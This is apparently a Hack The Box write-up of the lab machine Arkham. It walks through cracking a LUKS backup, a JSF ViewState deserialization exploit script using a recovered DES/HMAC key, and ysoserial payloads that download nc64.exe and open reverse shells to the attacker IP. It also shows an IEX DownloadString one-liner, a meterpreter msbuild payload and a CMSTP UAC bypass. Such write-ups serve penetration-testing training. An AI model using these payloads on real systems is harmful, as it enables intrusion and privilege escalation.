# Arkham [HTB](https://app.hackthebox.com/machines/179)
![arkham-01]()


## Recon

After adding the target to my `/etc/hosts` file i fire off an `nmap` scan:

```bash
nmap -sC -sV -A -p- arkham.htb -oN nmap.result
```

![nmap-res-02]()

We have the following:

+ An IIS v10.0 server on port 80.
+ An RPC endpoint-mapper on port 135.
+ NetBIOS on port 139.
+ An SMB server on port 445.
+ An Apache Tomcat server v8.5.37 on port 8080.
+ RPC related ports in 49666 & 49667.

Lets start by taking a quick look at the SMB server, maybe it allows unauthenticated access to system resources. After that we'll take a look at the HTTP servers. 

## SMB Port 445

Lets connect with a null session:

```bash
smbclient -N -L \\\\arkham.htb\\
```

![smb-list-03]()

We can see the target accepts null sessions. The `BatShare` looks unusual, can we connect to it?

```bash
smbclient -N  \\\\arkham.htb\\BatShare
```

![batshare-04]()

Yes we can connect anonymously. We have a single zip archive here, lets get it to our attack machine 
and examine it. 

```bash
unzip appserver.zip
```

![unzip-05]()

Looks like we have a `txt` file and a backup file. Lets read the `txt` file:

![note-06]()

They mention a Linux server, although the target OS is Windows:

```bash
crackmapexec smb arkham.htb -u '' -p ''
```

![crackmap-07]()

Wierd, maybe there is `wsl` in the enviorenment? lets check that backup file:

```bash
file backup.img
```
![luks-08]()

This is a block device encryptyed with [LUKS](https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup, lets try to crack it. 

Accourding to [this](https://hashcat.net/forum/thread-6225.html) hashcat post, the encryption and cipher types of our backup files are supported. Also accourding to the post, most linux filesystems place some sort of header when formatting a file system using `mkfs.XXX`, therefore `hashcat` only needs the first 2MB of the drive in order to perform an entropy check and bypass the expansive 2nd PBKDF2 computation. 

We can devide a block device in linux using `dd`:

```bash
dd if=backup.img of=header.luks bs=512 count=4097
```

![dd-09]()

This will create a 2MB file which includes all the data hashcat needs to crack the master key. 
After that, we can start cracking the LUKS with a dictionary attack:

```bash
hashcat -m 14600 -a 0 header.luks rockyou.txt
```

I run this on my host machine in order to utilize my GPU for the computation. After a couple of minutes we manage to find the master key:

![cracked-10]()

Now we can decrypt the block device with:

```bash
cryptsetup luksOpen backup.img batshare
```

With `batshare` being the name of the new block device to be created. Now we should be able to see
the new device by running: 

```bash
ls -al /dev/mapper
```

![mapper-11]()

Lets mount this drive with:

```bash
mkdir /mnt/batshare
mount /dev/mapper/batshare /mnt/batshare
```

Now we can `cd` into this file system and have a look around:

![tree-12]()

Looks like a websites configuration directory, At first, i checked `tomcat-users.xml`, as it is possible to gain RCE via the Tomcat Web Application Manager. The manager is used to give administrators the ability to remotly manage the site, by adding/ modifying, or removing content, if you have proper credentials. This can be levreged to upload a `.war` file and open it via the URL in order to get RCE. 
If we open the file we see that we have default users, but none has admin roles:

![users-13]()

We also need the manager portal which is usually under the `/manager/text` directory to be accesible, but in our case, it isnt. I ran directory and file scans on the target, but i didnt find the the manager feature to be enabled. So i moved on.

Then i decided to take a look at `server.xml`:

![server-14]()

I did a bit of reasearch and i found a nice [artical](https://hackmag.com/security/apache-tomcat-rce/) that describes how the Apache Tomcat's AJP connector can be exploited to retrive arbitrary files from the server, and if the server allows file uploads, this can be chained to gain RCE. 

In short, an unauthenticated attacker can send specially crafted AJP packets to a connector which by default, listenes on all IPv4 addresses on the localhost without an authorization secret to retrive files from the target. I've tested a couple of exploits againts our target, but that didnt work. 

Next, i turned to the `web.xml.bak` file, and this is where things started to get interesting. 

![faces-15]()

This configuration line establishes a new servlet class for the `*.faces` url pattern. So i decided to look around the site to find instances of this pattern, until i found the `Subscribe` button:

![sub-16]()

If we type some text into the box and click the `Sign Up` button, we get redircted to the following page:

![thanks-17]()

I wasn't sure exactly what these `.faces` files mean, so i decided to do a bit of research online, and thats where i started to find a lot of articals detailing exploits, like [this](https://dhiyaneshgeek.github.io/web/security/2021/05/08/demystifying-insecure-deserialisation-on-JSF-application/), and [this](https://www.exploit-db.com/docs/48126). 

In short, since `HTTP` is a stateless protocol, certian web servers implement a state management mechanisim in thier application stack. With the objective being to store and restore results of users actions that impacted the user interface of a web page, (The thank you page genereted based on our email input).

The Apache Tomcat is a pure Java server, and Java has `JavaServer Faces (JSF)` as its state management feature, This is where the `.faces` pages come in. In pages where state managment is implamanted, there will be a hidden field in the page named `javax.faces.ViewState`. If we refresh our request to the subscribe feature on our target and capture the request in Burp we can see the view state:

![viewstate-18]()


Why is this important? 

This `ViewState` field is a `serialized` Java object, and that makes it vulnerable to [deserialization attacks](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html). 

These attacks are letheal as insecure object desiralzation can lead to arbitrary command execution on the target OS. 

In hort, application objects that are processed in memory cant be saved to storage or transmintted over the network as is, they have to get serialzed. Once they reach thier target destination, the receving application has to desiralize the object in order to work with it in memory. If we as attackers, can pass our own seriazled objects to a target application, and if that target application blindly trusts our seriazled objects, and unsafly desrailzes them, we can inject commands in the object and have them executed by the target. 


This is what we want to do, and there are tools out there that can create these malicuse java seriazled objects for us, primarly the [ysoserial](https://github.com/frohoff/ysoserial) tool.

After i downloaded the tool i had issues running it. This happens becuase the tool doesnt run well on the latests versions of Java, [source](https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f). There was also an [offical issue](https://github.com/frohoff/ysoserial/issues/205) on the Github of the project. The work around is to install `openjdk-11-jdk` and add that to our PATH variable. 

After adding the older java version to our PATH with:

```bash
PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH 
```

We can run the `ysoserial` tool with:

```bash
java -jat ysoserial-all.jar <payload>
```

In order to generate a serialzed java object with `ysoserial` we need to select a payload type. Not to get to deep into it, but Java serialzed objects are comprised from different classes, and these classes have to exsits on our target applciation in order for the desiraltion attack to work. These classes are the different payloads types we can choose with `ysoserial`, therefore is chose the `BeanShell1` payload as its in the `faces-config.xml`. Here is my syntax:

```bash
java -jar ysoserial-all.jar BeanShell1 'dir' | base64 -w 0
```

![first-attempt-19]()

If we take this output, and paste that as the value for the `javax.faces.ViewState` field in our request to the server we can see the following:

![err-20]()

Defneatly a bug, but not RCE. I also tried to run `ping 10.10.14.61` while capturing the icmp packets on my machine with `tcpdump - eth0 icmp`, since i thought maybe it was a blind RCE, but nothing happened, why?

I decided to go back to the `web.xml.bak` file, and read through it. I also found [this](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application) post from Apache that explains the different parameters. 

Accourding to the post, encryption of the MyFaces seriazlized obejcts is enabled by default, with:

```xml
<context-param>
        <param-name>org.apache.myfaces.USE_ENCRYPTION</param-name>
        <param-value>true</param-value>
     </context-param>
```

I couldnt find this line in our config file. So i concluded that encryption is enbled implictly on our target. Later on in the post i also found that the defualt encryption is `DES`, and since i couldnt find the encryption type explictly set in the config file, i concluded again that the encryption is set to `DES` implicitly. But the encryption key was explicly defined in the config file:

![enc-key-21]()

This is `base64`, so we can decode with `echo 'SnNGOTg3Ni0=' | base64 -d`:

![decode-22]()

I also came to find that the serialzed objects are signed with SHA-1 for authintication:

![sha-23]()

The hashing key is the same as the encryption key. And now we understand why our first attempt didnt 
work, we didnt encrypt the payload nore did we sign it. 

The problem is that tools like `ysoserial` and `SerializationDumper` do not offer an option to encrypt the generated payloads, so we need to do that our selfs.

## Writing an Exploit

We know that we have both encryption and HMAC applyed to the viewstate object, Lets start by understanding what HAMC is. 

HMAC (keyed-hash message authentication code) is used to validate the authinticity of a message using a shared secret instead of digital signitures. HMAC uses two passes of hash computation. Before either pass, the secret key is used to derive two keys – inner and outer. Next, the first pass of the hash algorithm produces an internal hash derived from the message and the inner key. The second pass produces the final HMAC code derived from the inner hash result and the outer key.

This hash digest is then appended to the messages itself either encrypted or not, and sent to the recipent. When the recipent recives the message, they perfrom the hashing themselves and compare the hased digest they produced with the one from the message, if they match then the messege can be trusted. 

We know that a [SHA1](https://en.wikipedia.org/wiki/SHA-1) digest is 20-bytes long, but we need to determine if thoes 20 bytes are added to the start or the end of the message? 

We can determine this by hashing the message minus the first 20 bytes, and comparing the resulted digest to the first 20 bytes of the original messege. If they match then we know its the hash digest and therefore we can conclude the HMAC is added to the start of the message. 

If they dont match we can do the oppisite, by computing the hash of the message minus last 20 bytes, and comparing that againts the last 20 bytes of the original message to see if they match, if they do match, then we know the digest is added to the end of the message. 

This in effect, is what each party is doing when validating the message, only they know where in the message the hash is added, and we dont, so we have to test both cases to see where the results match. 
Lets start analyzing, first we need to decode the object found in the HTTP post request, as there are URL encoded characters in the message like `%2B` which is `+`. We can do this with the `unquated_plus` class from the `urlib.parse` module in Python:

```python
>>> from urlib.parse import unquated_plus as urldecode
>>> message = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RcJdqqT7ifhr70KtDtngjDm0mNzA9qHjYerxo0jW7zu1yeEFWecLimY1XY3Q%2BiON9uQYHUY%3D'
>>> b64 = urldecode(message)
>>> b64
'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RcJdqqT7ifhr70KtDtngjDm0mNzA9qHjYerxo0jW7zu1yeEFWecLimY1XY3Q+iON9uQYHUY='
```

Now this data is base64 encoded, so we can use the `b64decode` class from the `base64` module to transform the data into raw bytes:

```python
>>> from base64 import b64decode
>>> raw = b64decode(b64)
>>> raw
>>> raw
b'\xc0z4\xc2b\xee\xe5\xc7\x88\xb4\x88\xbe#\xb5\xe4\x12-F\x01\xbe!\xd7e\x99\xf3\xde)\x03\xe6x8~\xdbr\x8d\xa3\\L\xb5E\xc2]\xaa\xa4\xfb\x89\xf8k\xefB\xad\x0e\xd9\xe0\x8c9\xb4\x98\xdc\xc0\xf6\xa1\xe3a\xea\xf1\xa3H\xd6\xef;\xb5\xc9\xe1\x05Y\xe7\x0b\x8af5]\x8d\xd0\xfa#\x8d\xf6\xe4\x18\x1dF'
```
 
Now we have the raw DES cipher and the SHA1 digest in bytes, lets see whats what. To calculate the HMAC we can use the `hmac`  module. Lets start by investigating the first 20 bytes:

```python
>>> import hmac
>>> digest = raw[:20]       # set first the 20 bytes of the message as the hash digest
>>> msg = raw[20:]	    # treat everything after the first 20 bytes is the encrypted message
>>> hmac.new(b'JsF9876-', msg, 'sha1').digest()  # compute the hash of msg
b'\xa4\x87<\xd5\x1cp"\xad7\xd3g\xc3\xd2\xab\xa3\x03IG\xcb_'
>>> digest
b'\xc0z4\xc2b\xee\xe5\xc7\x88\xb4\x88\xbe#\xb5\xe4\x12-F\x01\xbe'  # Not the same
```

So we can see that the first 20 bytes didnt match the hash, lets try the last 20 bytes:

```python
>>> digest = raw[-20:]   # Set last 20 bytes as the digest
>>> msg = raw[:-20]      # Set the remaining bytes as the encrypted message
>>> hmac.new(b'JsF9876-', msg, 'sha1').digest()
b'\xc9\xe1\x05Y\xe7\x0b\x8af5]\x8d\xd0\xfa#\x8d\xf6\xe4\x18\x1dF'
>>> digest 
b'\xc9\xe1\x05Y\xe7\x0b\x8af5]\x8d\xd0\xfa#\x8d\xf6\xe4\x18\x1dF'   # same
```

Now we can see they match, so we've confirmd that the last 20 bytes of the message is the hash digest. Now we can decrypt the rest of the message. For this i will use the `Cryptodome` module in Python `pip install pycryptodome` (you can also use `Crypto`, for me it causes issues) 

```python
>>> from Cryptodome.Cipher import DES
>>> d = DES.new(b'JsF9876-', DES.MODE_ECB)
>>> d.decrypt(msg)
b'\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x01cpt\x00\x12/userSubscribe.jsp\x02\x02'
```

And there it is, we can see that our process was succsesful, as we can see the `java.lang.Object` sting in the output. Now we can move on to the final stage were we contruct our payload. 

We need to generate a serilzed java object with the correct class. I chose to use the `BeanShell1` class as its present in the `faces-config.xml`:

![beans-24]()

Here is the command:

```bash
java -jar ysoserial-all.jar BeanShell1 'ping 10.10.14.61' > payload.bin
```

Now we will open `payload.bin` from python, pad it with 8 bytes so we can encrypt the contents nicly with DES. Then we compute the SHA1 digest and add that to the end of the message, base64 encode it, and send it with `requests` which will also url encode it.

Here is the script:

```python
#!/usr/bin/python3

import base64
import hmac
import requests
from Cryptodome.Cipher import DES

with open('payload.bin', 'rb') as file:
    payload = file.read()

pad = (8 - (len(payload) % 8)) % 8
padded = payload + (chr(pad)*pad).encode()

d = DES.new(b'JsF9876-', DES.MODE_ECB)
encrypted_payload = d.encrypt(padded)
digest = hmac.new(b'JsF9876-', encrypted_payload, 'sha1').digest()

viewstate = base64.b64encode(encrypted_payload + digest)

sess = requests.session()
sess.get('http://arkham.htb:8080/userSubscribe.faces')
response = sess.post('http://arkham.htb:8080/userSubscribe.faces',
            data = {'j_id_jsp_1623871077_1%3Aemail': 'd',
                    'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',
                    'j_id_jsp_1623871077_1_SUBMIT': '1',
                    'javax.faces.ViewState': viewstate
                    }
    )
```

I setup `tcpdump -i eth0 icmp` and run the script but nothing happens. So i decide to try a different payload type with `ysoserial`. After some time i found that `CommonColletion5` gets me a ping.

```bash
java -jar ysoserial-all.jar CommonsCollections5 'ping 10.10.14.61' > payload.bin
```

![rce-25]()

Now we need to find a working payload for a reverse shell. At first i tired to host `nishang`'s reverse powershell script on a python web server, but that didnt work. Then i tired to host the same file through an SMB share, the target did connect to my share, but didnt get the file nor did it execute it.

So instead i decided to download `nc64.exe` to the target with:

```bash
java -jar ysoserial-all.jar CommonsCollections6 'powershell -exec bypass -c Invoke-WebRequest -uri "http://10.10.14.61/nc64.exe" -outfile \windows\System32\spool\drivers\color\netty.exe' > payload.bin
```

This worked, as the target retrived the file:

![retrived-26]()


Then i setup the reverse shell payload with:

```bash
java -jar ysoserial-all.jar CommonsCollections6 '\windows\System32\spool\drivers\color\netty.exe -e cmd 10.10.14.61 443' > payload.bin
```

i start mu listener with:

```bash
rlwrap nc -lnvp 443
```

And execute:

![shell-27]()



## Privilege Escalation

At first i tired to catch quick wins with `whoami /priv` and `cmdkey /list`, but they came up empty. 
Then i started to look around the system when i found `C:\Windows\Panther\Unattended.xml`. Inside it 
i saw an interesting user account:

![unattended-28]()

The `Batman` user is an admin on the machine, if we can get hes password we can use `psexec` to elavate privileges. I tired to hunt for hes passowrd in the registry with `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"` but that didnt work. 

I wondered around the file system for a while, looking through potentially interesting files, but found nothing useful, so i decide to shift gears and run [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) instead.

I troed to download it from my kali machine and execute it with one command:

```cmd
powershell --exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.61/PowerUp.ps1'); Invoke-AllChecks
```

But this gave the following error:

![err-29]()

Looks like we might be dealing with a restricted powershell enviorement, we can check this by running:

```cmd
powershell -exec bypass $ExecutionContext.SessionState.LanguageMode
```

![restricted-30]()

Yep, this is why our initial reverse shell payloads didnt work. I found [this](https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass) artcial that talks about how this can be curcemvanted. They suggest to run `powershell -version 2`, in our case it doesnt work:

![ps-v2-31]()

But they also mantion that we also bypass the constrained language mode by adding the string `system32` to our script name, like `system32.ps1`, I gave it a shot and ran `PowerUp` on the target, but that didnt 
yield anything useful. I also tried `winPEASx64.exe`  bu that didnt work as well.

So i decided to look through the file system again, this time i decided to focus on my user's home folder. Where io found an unusual folder in `C:\Users\alfred\Downloads\backups\`

![backups-32]()

I tried to get the file to my Kali machine using an FTP server, didnt work, lets try `impacket-smbserver`. We need to setup credentials to access the share otherwise the target machine will block the connection:

```bash
impacket-smbserver -smb2support -username htb -password htb arkham .
```

Now we can connect to the share from the target using:

```cmd
net use \\10.10.14.61\arkham /u:htb htb
```

Now we can copy the `backup.zip` file to the Kali machine with:

```cmd
copy backup.zip \\10.10.14.61\\arkham
```

![copy-33]()

Lets analyze this file. If we list the contents of the archive with `unzip -l backup.zip` we can see:

![ost-34]()

We have a `.ost` file, which is a Microsoft Outlook email folder. we can open this on linux with `readpst`, which reads both pst and ost files.

```bash
readpst alfred@arkham.local.ost
```

![readpst-35]()

This creates `Drafts.mbox` in my working directory:

![drafts-36]()

We can open this file with `mutt` as such:

`mutt -R -f Drafts.mbox`

![mbox-37]()

If we hit Enter to view the message, we see a bunch of HTML code, but down at the buttom we see an attachment:

![img-38]()

Lets hit `v` to view the image:

![pass-39]()

The password for `Batman`'s account is `Zx^#QZX+T!123`. I tried `psexec` and other methods to get a shell as the btaman user but they all failed. Instead we can use `New-PSession` cmdlet from powershell to 
start a session as another user. 

```cmd
powershell
$username = "arkham\batman"
$password = "Zx^#QZX+T!123"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
new-pssession -computername . -credential $cred
```

This should give you a new pwershell session as Batman:

![batman-40]()

This shell was very slow to me, so i ran `nc` to connect back to my machine:

```cmd
\windows\System32\spool\drivers\color\n.exe -e cmd 10.10.14.61 444
```

![batshell-41]()


Alternativly, we could have made a connection using `WinRM`, as it seems that the target is listening for
connections on port `5985`:

![winrm-42]()

To do this we can use [chisel](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html), or [plink](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-plink) tp do port forwarding, and then use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect as the `Batman` user. 


## UAC Bypass


In any way, even though we landed a shell as an admin user, and we can in fact go into the `Administrator`'s desktop to get `root.txt`, we are still in a low privilege shell:

![low-priv-43]()

If this was a true admin shell, we would have had a lot more privileges. Not only that, but the powershell is also in a constrained mode:

![constrained-44]()

In order to break out of the constrained powershell, we can use [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM), however in this case it wont help us. To really bypass the UAC we need to switch to an interactive process. The easiset way to do this will be Metasploit with GreatSCT, which is a tool used to generate metasploit payload that bypass anti-viruses and white listings..

First step, clone [GreatSCT](https://github.com/GreatSCT/GreatSCT) to your /opt folder:

```bash
git clone https://github.com/GreatSCT/GreatSCT.git
```
![clone-45]()

Now run the `setup.sh`

```bash
cd GreatSCT/setup
./setup.sh -c
```

Could take a mintue or so. Once its installed start the program with `/GreatSCT.py`. If its your first time, you can scroll around the different options with `list` and `info` commands. For our case we want to select `use bypass`, which will load the bypass payloads:

![bypass-46]()

Now we run `list` to list out the avialable payloads:

![list-47]()

There are more payloads at the buttom, but we are going to use this one. Run `use msbuild/meterpreter/rev_tcp.py` to start the setup. This will open a metsploit type payload configuration page where we can input our LHOST and LPORT:

![setup-48]()

After that we are ready to generate the payload so type `generate` and hit enter. It then asks for a base name for the file so i type `arkham`. Then we can press `Enter` to go bacvk to the main menu, and then we can type exit to `close` the program.

This process should have proceduced a metasploit file under `/usr/share/greatsct-output/handlers/`:

![payload-49]()

And a source code file to transfer to the target under `/usr/share/greatsct-output/source/`:

![source-49.5]()

Lets trasnfer both files to our working directory and start metasploit with this `rc` file:

```bash
msfconsole -r arkham.rc
```

![msf-50]()

Now lets transfer the `arkham.xml` to the target with:

```cmd
powershell -c iwr -uri 10.10.14.61/arkham.xml -outfile a.xml
```

Now we are ready to execute, from the target use `MSBuild.exe` againts the `xml` file:

![execute-51]()

This freexes the shell, but on our metasploit we get a connection:

![conn-52]()

Now lets enter the session with `sessions -i 1` nad load powershell:

![full-53]()

The first time i did this the session died on me, but this spwned a seconed session and this time it worked. 


Now we want to migrate to an interactive and a x64 process, `explorer.exe` is an easy choice:

![migrate-54]()


Now we have an interactive process with full powershell, so we can finally bypass any UAC's with CMSTP.


## CMSTP UAC Bypass

[This artical](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html) explains the attack process in a more detailed way. In short, we are going to transfer some C-sharp source code to the target and compile it to a dll with powershell. 

The file we need to upload is `Sourece.cs`, lets transfer it to the target with:

```powershell
iwr -uri 10.10.14.61/Source.cs -outfile C:\\Users\Batman\AppData\Local\temp\Source.cs
```

Now we compile it with:

```powerhsell
cd c:\\users\Batman\AppData\Local\Temp
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
```

This should create the dll file: 

![ls-55]()


Now we load the dll into memory:

```powershell
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
```
![load-56]


And then we call the exported function passig in the command we want to run, which in our case is nc.exe for a reverse shell. 

```powershell
[CMSTPBypass]::Execute("C:\windows\System32\spool\drivers\color\n.exe -e cmd 10.10.14.61 9001")
```

This give me a fully privileges shell:

![root-57]()
